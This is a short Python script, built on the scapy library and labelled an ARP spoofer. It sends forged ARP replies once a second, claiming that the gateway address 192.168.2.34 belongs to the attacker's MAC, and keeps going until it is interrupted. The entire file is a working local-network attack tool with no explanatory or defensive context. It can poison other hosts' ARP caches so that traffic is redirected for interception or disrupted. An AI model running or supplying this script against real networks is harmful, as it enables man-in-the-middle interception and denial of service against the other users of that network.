#!/usr/bin/env python
import sys
from scapy.all import *

conf.verb = 0

op = 2
attacker_mac = '00:0c:29:10:12:72'
gateway = '192.168.2.34'
target_ip = '255.255.255.255'
target_mac = "11:11:11:11:11:11"

arp = ARP(op=op, psrc=gateway, pdst=target_ip, hwsrc=attacker_mac, hwdst=target_mac)

print( "Arp Spoof started..")
try:
    while True:
        send(arp)
        time.sleep(1)
except KeyboardInterrupt:
    print ("Arp spoof finished..")

s
